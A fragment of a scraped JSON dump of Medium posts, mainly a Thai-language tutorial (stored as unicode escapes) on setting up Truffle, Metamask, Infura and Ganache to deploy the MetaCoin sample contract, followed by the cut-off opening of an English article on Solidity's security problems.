\u0e44\u0e1b\u0e43\u0e2a\u0e48\u0e44\u0e27\u0e49\u0e14\u0e49\u0e27\u0e22\u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a VSCode \u0e1c\u0e21\u0e43\u0e0a\u0e49 Plugin \u0e0a\u0e37\u0e48\u0e2d SolidityInstall Truffle \u0e14\u0e49\u0e27\u0e22 NPMNPM \u0e04\u0e37\u0e2d Package Manager \u0e02\u0e2d\u0e07 NodeJS \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e14\u0e49\u0e21\u0e32\u0e14\u0e49\u0e27\u0e22\u0e15\u0e2d\u0e19\u0e25\u0e07 NodeJS \u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e21\u0e31\u0e19\u0e43\u0e19\u0e01\u0e32\u0e23\u0e25\u0e07 Truffle CLInpm install -g truffle\u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e25\u0e07\u0e41\u0e25\u0e49\u0e27\u0e25\u0e2d\u0e07\u0e23\u0e31\u0e19 truffle\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e25\u0e2d\u0e07\u0e2a\u0e23\u0e49\u0e32\u0e07 Project Metacoin \u0e02\u0e2d\u0e07 Truffle \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04\u0e15\u0e31\u0e27\u0e2d\u0e22\u0e48\u0e32\u0e07 \u0e42\u0e14\u0e22\u0e40\u0e23\u0e34\u0e48\u0e21\u0e08\u0e32\u0e01\u0e01\u0e32\u0e23\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e42\u0e1f\u0e25\u0e40\u0e14\u0e2d\u0e23\u0e4c\u0e0a\u0e37\u0e48\u0e2d Metacoin \u0e41\u0e25\u0e49\u0e27\u0e23\u0e31\u0e19 truffle unbox metacoinmkdir Metacoincd Metacointruffle unbox metacoin\u0e2b\u0e23\u0e37\u0e2d\u0e16\u0e49\u0e32\u0e43\u0e04\u0e23\u0e2d\u0e22\u0e32\u0e01\u0e44\u0e14\u0e49\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04\u0e40\u0e1b\u0e25\u0e48\u0e32 \u0e46 \u0e01\u0e47\u0e43\u0e2b\u0e49\u0e23\u0e31\u0e19 truffle init \u0e41\u0e15\u0e48\u0e43\u0e19\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 Metacoin \u0e01\u0e48\u0e2d\u0e19\u0e40\u0e1e\u0e23\u0e32\u0e30\u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e17\u0e14\u0e2a\u0e2d\u0e1a Environment \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e40\u0e0b\u0e15\u0e43\u0e19\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04\u0e02\u0e2d\u0e07 Truffle \u0e08\u0e30\u0e1b\u0e23\u0e30\u0e01\u0e2d\u0e1a\u0e44\u0e1b\u0e14\u0e49\u0e27\u0e22\u0e42\u0e1f\u0e25\u0e40\u0e14\u0e2d\u0e23\u0e4c\u0e17\u0e35\u0e48\u0e2a\u0e33\u0e04\u0e31\u0e0d\u0e04\u0e37\u0e2dcontracts \u0e40\u0e2d\u0e32\u0e44\u0e27\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e1f\u0e25\u0e4c soliditymigrations \u0e40\u0e2d\u0e32\u0e44\u0e27\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e1f\u0e25\u0e4c migration \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e01\u0e32\u0e23 Deploytest \u0e40\u0e2d\u0e32\u0e44\u0e27\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e40\u0e17\u0e2a\u0e2a\u0e48\u0e27\u0e19 folder build \u0e19\u0e31\u0e49\u0e19\u0e08\u0e30\u0e40\u0e01\u0e34\u0e14\u0e08\u0e32\u0e01\u0e01\u0e32\u0e23 build \u0e0b\u0e36\u0e48\u0e07\u0e08\u0e30\u0e16\u0e39\u0e01\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e2d\u0e31\u0e15\u0e42\u0e19\u0e21\u0e31\u0e15\u0e34 \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e41\u0e01\u0e49\u0e44\u0e02\u0e42\u0e14\u0e22\u0e15\u0e23\u0e07\u0e17\u0e35\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e21\u0e32\u0e14\u0e39\u0e44\u0e1f\u0e25\u0e4c\u0e17\u0e35\u0e48\u0e2a\u0e33\u0e04\u0e31\u0e0d\u0e01\u0e31\u0e19contracts/Migrations.solMigrations.sol\u0e44\u0e1f\u0e25\u0e4c Migration \u0e40\u0e1b\u0e47\u0e19\u0e44\u0e1f\u0e25\u0e4c Contract \u0e17\u0e35\u0e48\u0e43\u0e0a\u0e49\u0e40\u0e01\u0e47\u0e1a State \u0e02\u0e2d\u0e07 Migration \u0e02\u0e2d\u0e07 Contract \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32 Deploy \u0e2d\u0e35\u0e01\u0e17\u0e35 \u0e1b\u0e01\u0e15\u0e34\u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e41\u0e01\u0e49\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49contracts/MetaCoin.sol \u0e41\u0e25\u0e30\u0e44\u0e1f\u0e25\u0e4c .sol \u0e2d\u0e37\u0e48\u0e19 \u0e46\u0e44\u0e1f\u0e25\u0e4c .sol \u0e2d\u0e37\u0e48\u0e19 \u0e46 \u0e04\u0e37\u0e2d\u0e44\u0e1f\u0e25\u0e4c\u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e08\u0e30\u0e40\u0e02\u0e35\u0e22\u0e19 Smart Contract \u0e40\u0e0a\u0e48\u0e19 \u0e16\u0e49\u0e32\u0e40\u0e23\u0e32\u0e40\u0e02\u0e35\u0e22\u0e19 HelloWorld Contract \u0e40\u0e23\u0e32\u0e01\u0e47\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e44\u0e1f\u0e25\u0e4c HelloWorld.sol \u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e2d\u0e35\u0e01\u0e2d\u0e31\u0e19\u0e2b\u0e19\u0e36\u0e48\u0e07migrations/2_deploy_contracts.js\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e43\u0e0a\u0e49\u0e1a\u0e2d\u0e01\u0e27\u0e48\u0e32\u0e40\u0e23\u0e32\u0e08\u0e30 deploy contract \u0e2d\u0e30\u0e44\u0e23\u0e1a\u0e49\u0e32\u0e07 \u0e42\u0e14\u0e22\u0e16\u0e49\u0e32\u0e40\u0e23\u0e32\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04\u0e14\u0e49\u0e27\u0e22 truffle init \u0e08\u0e30\u0e44\u0e21\u0e48\u0e21\u0e35\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49 \u0e41\u0e25\u0e30\u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e40\u0e2d\u0e07\u0e2a\u0e31\u0e07\u0e40\u0e01\u0e15\u0e27\u0e48\u0e32\u0e08\u0e30\u0e21\u0e35\u0e40\u0e25\u0e02 2 \u0e02\u0e49\u0e32\u0e07\u0e2b\u0e19\u0e49\u0e32\u0e19\u0e31\u0e48\u0e19\u0e04\u0e37\u0e2d state \u0e02\u0e2d\u0e07 Migrations.sol \u0e42\u0e14\u0e22\u0e21\u0e31\u0e19\u0e08\u0e30\u0e08\u0e31\u0e14\u0e01\u0e32\u0e23\u0e27\u0e48\u0e32\u0e40\u0e23\u0e32\u0e17\u0e33\u0e01\u0e32\u0e23 Migrate \u0e44\u0e1b\u0e01\u0e35\u0e48\u0e04\u0e23\u0e31\u0e49\u0e07 \u0e16\u0e36\u0e07\u0e02\u0e31\u0e49\u0e19\u0e44\u0e2b\u0e19\u0e41\u0e25\u0e49\u0e27 \u0e40\u0e0a\u0e48\u0e19 1, 2 ,3 \u0e1b\u0e01\u0e15\u0e34\u0e41\u0e25\u0e49\u0e27\u0e16\u0e49\u0e32\u0e40\u0e23\u0e32\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49 Deploy Contract \u0e15\u0e48\u0e2d\u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e01\u0e31\u0e19\u0e2b\u0e25\u0e32\u0e22 \u0e46 \u0e04\u0e23\u0e31\u0e49\u0e07\u0e43\u0e19\u0e40\u0e27\u0e25\u0e32\u0e19\u0e32\u0e19 \u0e40\u0e23\u0e32\u0e01\u0e47\u0e21\u0e31\u0e01\u0e08\u0e30\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e1f\u0e25\u0e4c 2_deploy_contracts.js \u0e40\u0e1e\u0e35\u0e22\u0e07\u0e41\u0e04\u0e48\u0e44\u0e1f\u0e25\u0e4c\u0e40\u0e14\u0e35\u0e22\u0e27\u0e16\u0e49\u0e32\u0e43\u0e04\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 truffle init \u0e41\u0e25\u0e30\u0e40\u0e02\u0e35\u0e22\u0e19 Contract \u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e02\u0e36\u0e49\u0e19\u0e21\u0e32 \u0e2d\u0e22\u0e48\u0e32\u0e25\u0e37\u0e21\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e41\u0e25\u0e30\u0e41\u0e01\u0e49\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e43\u0e2b\u0e49\u0e16\u0e39\u0e01\u0e14\u0e49\u0e27\u0e22tests/\u0e44\u0e1f\u0e25\u0e4c\u0e40\u0e17\u0e2a\u0e08\u0e30\u0e1b\u0e23\u0e30\u0e01\u0e2d\u0e1a\u0e44\u0e1b\u0e14\u0e49\u0e27\u0e22 2 \u0e23\u0e39\u0e1b\u0e41\u0e1a\u0e1a\u0e04\u0e37\u0e2dJavascript Test (.js)\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e17\u0e2a\u0e08\u0e32\u0e01\u0e20\u0e32\u0e22\u0e19\u0e2d\u0e01 Contract \u0e40\u0e2b\u0e21\u0e37\u0e2d\u0e19\u0e01\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 ApplicationSolidity Test (.sol) \u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e17\u0e2a\u0e15\u0e31\u0e27 Contract \u0e42\u0e14\u0e22\u0e15\u0e23\u0e07truffle-config.js\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e15\u0e04\u0e48\u0e32\u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e02\u0e2d\u0e07 local truffle project \u0e42\u0e14\u0e22\u0e1b\u0e01\u0e15\u0e34\u0e41\u0e25\u0e49\u0e27\u0e08\u0e30\u0e40\u0e0b\u0e15\u0e04\u0e48\u0e32 network \u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e40\u0e0a\u0e48\u0e19 development network \u0e2d\u0e22\u0e39\u0e48\u0e17\u0e35\u0e48\u0e44\u0e2b\u0e19, Ethereum Mainnet \u0e2d\u0e22\u0e39\u0e48\u0e17\u0e35\u0e48\u0e44\u0e2b\u0e19 \u0e40\u0e0a\u0e48\u0e19\u0e43\u0e19\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e08\u0e30\u0e40\u0e0b\u0e15\u0e44\u0e27\u0e49 2 \u0e15\u0e31\u0e27\u0e04\u0e37\u0e2d development \u0e41\u0e25\u0e30 test \u0e40\u0e27\u0e25\u0e32\u0e40\u0e23\u0e32\u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 truffle \u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e01\u0e47\u0e08\u0e30\u0e21\u0e32\u0e14\u0e39\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e01\u0e48\u0e2d\u0e19\u0e27\u0e48\u0e32 network \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e2a\u0e31\u0e48\u0e07\u0e19\u0e31\u0e49\u0e19\u0e0a\u0e35\u0e49\u0e44\u0e1b\u0e17\u0e35\u0e48\u0e44\u0e2b\u0e19 \u0e40\u0e0a\u0e48\u0e19truffle migrate --network development\u0e08\u0e30\u0e0a\u0e35\u0e49\u0e44\u0e1b\u0e17\u0e35\u0e48 network.development \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e40\u0e0b\u0e15\u0e44\u0e27\u0e49 \u0e43\u0e19\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e01\u0e25\u0e31\u0e1a\u0e21\u0e32\u0e41\u0e01\u0e49\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e0a\u0e35\u0e49\u0e44\u0e1b\u0e17\u0e35\u0e48 Ethereum Testnet \u0e41\u0e25\u0e30 Local Ethereum \u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e2b\u0e31\u0e27\u0e02\u0e49\u0e2d\u0e16\u0e31\u0e14\u0e44\u0e1b3. Metamask\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 Metamask Wallet \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e01\u0e47\u0e1a Key \u0e17\u0e35\u0e48\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23 Deploy Smart Contract \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 Network \u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e43\u0e0a\u0e48 Local Network \u0e42\u0e14\u0e22\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e17\u0e35\u0e48 metamask.io\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e25\u0e07\u0e41\u0e25\u0e49\u0e27 Metamask \u0e08\u0e30\u0e2d\u0e22\u0e39\u0e48\u0e21\u0e38\u0e21\u0e02\u0e27\u0e32\u0e1a\u0e19\u0e02\u0e2d\u0e07 Chrome \u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e01\u0e14\u0e17\u0e35\u0e48 icon \u0e41\u0e25\u0e49\u0e27\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e01\u0e23\u0e30\u0e40\u0e1b\u0e4b\u0e32\u0e15\u0e32\u0e21\u0e02\u0e31\u0e49\u0e19\u0e15\u0e2d\u0e19\u0e08\u0e19\u0e21\u0e32\u0e16\u0e36\u0e07\u0e2b\u0e19\u0e49\u0e32\u0e19\u0e35\u0e49\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e44\u0e14\u0e49 Address \u0e41\u0e25\u0e49\u0e27\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32 Copy Address \u0e02\u0e2d\u0e07\u0e01\u0e23\u0e30\u0e40\u0e1b\u0e4b\u0e32\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e44\u0e1b\u0e02\u0e2d\u0e40\u0e07\u0e34\u0e19\u0e08\u0e32\u0e01 Ropsten Testnet \u0e17\u0e35\u0e48 https://faucet.metamask.io/\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19 Network \u0e02\u0e2d\u0e07 Metamask \u0e44\u0e1b\u0e17\u0e35\u0e48 Ropsten \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e14\u0e39\u0e40\u0e07\u0e34\u0e19\u0e08\u0e32\u0e01 Ropsten \u0e02\u0e2d\u0e07 Address \u0e19\u0e35\u0e49\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e1b\u0e40\u0e2d\u0e32 Private Key \u0e08\u0e32\u0e01 Metamask \u0e40\u0e01\u0e47\u0e1a\u0e44\u0e27\u0e49\u0e14\u0e49\u0e27\u0e22 \u0e0b\u0e36\u0e48\u0e07\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23 Config Truffle \u0e42\u0e14\u0e22\u0e01\u0e14\u0e17\u0e35\u0e48\u0e1b\u0e38\u0e48\u0e21 \u2026 -> Account Detail -> Export Private Key4. Infura\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e01\u0e48\u0e2d\u0e19\u0e40\u0e23\u0e32\u0e2d\u0e32\u0e08\u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e15\u0e31\u0e49\u0e07 Ethereum Node \u0e40\u0e1e\u0e37\u0e48\u0e2d Sync \u0e01\u0e31\u0e1a Ethereum Network \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e04\u0e38\u0e22\u0e01\u0e31\u0e1a Ethereum Network \u0e19\u0e31\u0e49\u0e19 \u0e46 \u0e41\u0e15\u0e48 Infura \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e0a\u0e35\u0e27\u0e34\u0e15\u0e40\u0e23\u0e32\u0e07\u0e48\u0e32\u0e22\u0e02\u0e36\u0e49\u0e19\u0e40\u0e1e\u0e23\u0e32\u0e30 Infura \u0e15\u0e31\u0e49\u0e07 Node \u0e41\u0e25\u0e49\u0e27 Expose \u0e21\u0e32\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e1f\u0e23\u0e35 \u0e46 \u0e42\u0e14\u0e22\u0e44\u0e1b\u0e17\u0e35\u0e48 infura.io \u0e41\u0e25\u0e49\u0e27\u0e2a\u0e21\u0e31\u0e04\u0e23\u0e41\u0e25\u0e30\u0e2a\u0e23\u0e49\u0e32\u0e07 Project \u0e44\u0e27\u0e49\u0e1e\u0e2d\u0e44\u0e14\u0e49\u0e41\u0e25\u0e49\u0e27\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32 Copy Project ID \u0e44\u0e27\u0e49 \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e23\u0e32\u0e08\u0e30\u0e40\u0e2d\u0e32\u0e44\u0e1b\u0e40\u0e0b\u0e15\u0e43\u0e19 truffle \u0e40\u0e0a\u0e48\u0e19\u0e01\u0e31\u0e195. GanacheGanache \u0e40\u0e1b\u0e47\u0e19 Ethereum Node \u0e17\u0e35\u0e48\u0e40\u0e1b\u0e47\u0e19 Standalone \u0e44\u0e27\u0e49\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e1a\u0e19\u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07\u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e42\u0e14\u0e22 Ganache \u0e08\u0e30\u0e17\u0e33\u0e07\u0e32\u0e19\u0e41\u0e1a\u0e1a 1 Block/1 Transaction\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 Ganache \u0e40\u0e1e\u0e23\u0e32\u0e30\u0e1a\u0e32\u0e07\u0e04\u0e23\u0e31\u0e49\u0e07\u0e40\u0e23\u0e32\u0e44\u0e21\u0e48\u0e2d\u0e22\u0e32\u0e01 Deploy \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 Ropsten \u0e40\u0e1e\u0e23\u0e32\u0e30\u0e43\u0e0a\u0e49\u0e40\u0e27\u0e25\u0e32\u0e19\u0e32\u0e19\u0e41\u0e25\u0e30\u0e40\u0e23\u0e32\u0e2d\u0e22\u0e32\u0e01\u0e14\u0e39\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e07\u0e48\u0e32\u0e22 \u0e46\u0e1e\u0e2d Install \u0e41\u0e25\u0e49\u0e27\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e23\u0e31\u0e19\u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e41\u0e25\u0e30\u0e2a\u0e23\u0e49\u0e32\u0e07 Workspace \u0e42\u0e14\u0e22\u0e0a\u0e35\u0e49\u0e44\u0e1b\u0e17\u0e35\u0e48 truffle-config.js \u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e43\u0e2b\u0e49\u0e14\u0e39 port \u0e02\u0e2d\u0e07 RPC Server \u0e40\u0e0a\u0e48\u0e19\u0e02\u0e2d\u0e07\u0e1c\u0e21\u0e40\u0e1b\u0e47\u0e19 7545 \u0e43\u0e2b\u0e49\u0e40\u0e01\u0e47\u0e1a\u0e40\u0e25\u0e02\u0e19\u0e35\u0e49\u0e44\u0e27\u0e49\u0e44\u0e1b\u0e41\u0e01\u0e49\u0e44\u0e02\u0e44\u0e1f\u0e25\u0e4c truffle-config.js \u0e40\u0e0a\u0e48\u0e19\u0e01\u0e31\u0e196. \u0e25\u0e2d\u0e07 Deploy Smart Contract \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 Chain\u0e01\u0e48\u0e2d\u0e19\u0e2d\u0e37\u0e48\u0e19\u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e44\u0e1b\u0e41\u0e01\u0e49\u0e44\u0e02\u0e44\u0e1f\u0e25\u0e4c truffle-config.js \u0e14\u0e31\u0e07\u0e19\u0e35\u0e49\u0e08\u0e30\u0e40\u0e2b\u0e47\u0e19\u0e27\u0e48\u0e32\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 process.env \u0e43\u0e19\u0e01\u0e32\u0e23\u0e14\u0e36\u0e07 GANACHE_PORT, SECRET_KEY \u0e41\u0e25\u0e30 INFURA_KEY \u0e42\u0e14\u0e22\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 dotenv \u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e0a\u0e48\u0e27\u0e22\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e15 Environment Variable \u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e44\u0e1b\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e44\u0e1f\u0e25\u0e4c\u0e0a\u0e37\u0e48\u0e2d .env \u0e44\u0e27\u0e49\u0e02\u0e49\u0e32\u0e07 \u0e46 truffle-config.js \u0e41\u0e25\u0e49\u0e27\u0e43\u0e2a\u0e48\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e17\u0e35\u0e48\u0e44\u0e14\u0e49\u0e08\u0e32\u0e01\u0e02\u0e49\u0e2d\u0e17\u0e35\u0e48\u0e41\u0e25\u0e49\u0e27\u0e14\u0e31\u0e07\u0e19\u0e35\u0e49SECRET_KEY=<Your Secret Key>INFURAT_KEY=<Your Infura Project Id>GANACHE_PORT=7547\u0e40\u0e23\u0e32\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e2d\u0e07 Install dotenv \u0e41\u0e25\u0e30 truffle-hdwallet-provider \u0e14\u0e49\u0e27\u0e22 npmnpm install dotenv truffle-hd-wallet-provider\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e17\u0e38\u0e01\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e40\u0e2a\u0e23\u0e47\u0e08\u0e41\u0e25\u0e49\u0e27\u0e43\u0e2b\u0e49\u0e25\u0e2d\u0e07 deploy \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 Ganache \u0e14\u0e49\u0e27\u0e22\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07truffle migrate --network development\u0e16\u0e49\u0e32\u0e2d\u0e22\u0e32\u0e01 deploy \u0e02\u0e36\u0e49\u0e19\u0e1a\u0e19 Ropsten \u0e43\u0e2b\u0e49\u0e23\u0e31\u0e19truffle migrate --network ropsten\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e40\u0e2a\u0e23\u0e47\u0e08\u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e14\u0e39\u0e1a\u0e19 Ganache \u0e44\u0e14\u0e49 \u0e08\u0e30\u0e40\u0e2b\u0e47\u0e19\u0e27\u0e48\u0e32\u0e21\u0e35 Contract \u0e40\u0e1e\u0e34\u0e48\u0e21\u0e21\u0e32 3 \u0e15\u0e31\u0e27\u0e2a\u0e48\u0e27\u0e19\u0e1c\u0e25\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e1a\u0e19 Ropsten \u0e08\u0e30\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e41\u0e1a\u0e1a\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e14\u0e39\u0e44\u0e14\u0e49\u0e1a\u0e19 Ropsten Chain\u0e40\u0e23\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e43\u0e0a\u0e49 truffle console \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e40\u0e23\u0e35\u0e22\u0e01 Contract \u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e44\u0e14\u0e49\u0e14\u0e49\u0e27\u0e22 \u0e2d\u0e22\u0e48\u0e32\u0e25\u0e37\u0e21\u0e43\u0e2a\u0e48 --network ropsten \u0e2b\u0e23\u0e37\u0e2d --network developmentMetaCoin.deployed().then(function(instance){return instance });MetaCoin.deployed().then(function(instance){return instance.getBalance(\"0x15b5E3E6A947b790de45B485Bb850dee77D9aF9d\")});\u0e40\u0e2a\u0e23\u0e47\u0e08\u0e41\u0e25\u0e49\u0e27\u0e04\u0e23\u0e31\u0e1a\u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e15\u0e2d\u0e31\u0e1e\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e23\u0e34\u0e48\u0e21\u0e40\u0e02\u0e35\u0e22\u0e19\u0e41\u0e25\u0e30\u0e01\u0e32\u0e23 Deploy Solidity Smart Contract \u0e1a\u0e19 Ethereum\u0e16\u0e49\u0e32\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e19 \u0e46 \u0e0a\u0e2d\u0e1a\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e01\u0e31\u0e1a Blockchain \u0e02\u0e2d\u0e07\u0e1c\u0e21 \u0e1d\u0e32\u0e01\u0e41\u0e0a\u0e23\u0e4c\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e41\u0e25\u0e30\u0e01\u0e14\u0e15\u0e34\u0e14\u0e15\u0e32\u0e21\u0e40\u0e1e\u0e08\u0e41\u0e25\u0e30 Medium \u0e14\u0e49\u0e27\u0e22\u0e19\u0e30\u0e04\u0e23\u0e31\u0e1a", "responses": 1, "tags": ["Ethereum", "Blockchain", "Smart Contract", "Solidity", "Tutorial"]}, {"title": "Smart Contracts on Steroids: Solving the Problems Facing Ethereum\u2019s Solidity", "post_link": "https://medium.com/hackernoon/smart-contracts-on-steroids-solving-the-problems-facing-ethereums-solidity-a1f71cc260ce?source=search_post", "author_name": "Rachel Wolfson", "author_link": "https://medium.com/@rachelwolfson", "publish_date": "2018-07-30", "last_modified_date": "2018-07-30", "readtime": "4.49", "claps": 209, "voters": 20, "content": "Smart Contracts on Steroids: Solving the Problems Facing Ethereum\u2019s SolidityRachel WolfsonFollowJul 30, 2018 \u00b7 5 min readflickrThe Ethereum network currently consists of more than 1,700 decentralized applications (DApps), a number that is expected to grow in the coming years. And while all of these DApps rely on smart contracts to accomplish a number of important tasks, it has become clear that smart contracts are prone to errors, bugs and other catastrophic mistakes \u2014 to the tune of more than a billion dollars stolen in smart contract hacks to-date.In order to write a smart contract, programmers must learn an entirely new programming language called \u201cSolidity.\u201d While smart contracts facilitate complex operations in ethereum, making simple mistakes while writing smart contracts in Solidity can cause dire consequences, including security breaches and / or very high transactional costs.One of the most well-known examples of a poorly-coded smart contract came from the Decentralized Autonomous Organization (DAO). A 